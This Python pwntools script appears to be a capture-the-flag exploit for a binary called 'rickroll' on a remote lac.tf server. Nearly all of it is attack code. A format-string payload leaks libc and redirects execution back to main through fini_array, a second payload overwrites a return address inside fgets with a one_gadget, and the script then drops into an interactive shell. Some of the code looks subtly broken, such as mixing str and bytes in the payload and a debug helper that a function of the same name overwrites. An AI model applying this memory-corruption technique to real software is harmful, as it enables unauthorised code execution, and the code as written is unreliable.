# -*- coding: UTF-8 -*-
from pwn import *
import sys
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
python_version = sys.version_info.major
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')

debug = False if "r" in sys.argv else True

vuln_name = "./rickroll"
libc_path = "./libc.so.6"
libc_source_path = "/home/yrl/glibc-all-in-one/libs-src/glibc-2.36"
libc_symbol_path = "/home/yrl/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/.debug/d1/704d25fbbb72fa95d517b883131828c0883fe9.debug"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)
os.system("chmod +x " + vuln_name)

if debug:
    io = process([vuln_name],env={'LD_PRELOAD':libc_path})
else:
    io = remote("lac.tf", 31135)

def debug(gdb_script=None):
    if gdb_script:
        gdb.attach(io,gdb_script.format(libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))
    gdb.attach(io)
    pause()

def get_libc_gadget(rop_gadget):
    if python_version == 2:
        gadget = libc.search(rop_gadget).next() if rop_gadget == '/bin/sh\x00' else libc.search(asm(rop_gadget)).next()
    else:
        gadget = libc.search(rop_gadget).__next__() if rop_gadget == b'/bin/sh\x00' else libc.search(asm(rop_gadget)).__next__()
    return gadget

    
gdb_script='''
source /home/yrl/loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''
l64 = lambda      :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
l32 = lambda      :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a.encode(),b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x.encode()) if python_version == 3 and type(x) == str else io.sendline(x)
sa = lambda a,b		: io.sendafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : debug(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


fini = 0x403e18
# modify 0x40406c = 0 , modify fini_array offset points to fgets in main
pay = '%39$paaa%239c%12$hhn%232c%58$hn%4036c%13$hnaaaaa' + p64(0x40406c) + p64(0x404000)
#debug()
sla('Lyrics: ',pay)	
ru("run around and ")
libc.address = int(io.recv(14), 16) - 0x23d0a
lg('libc.address')
one = libc.address + 0xc961a
lg('one')

# Overwrite fgets internal return address is one
pay = p64(0)*10 + p64(one)
sl(pay)	
irt()



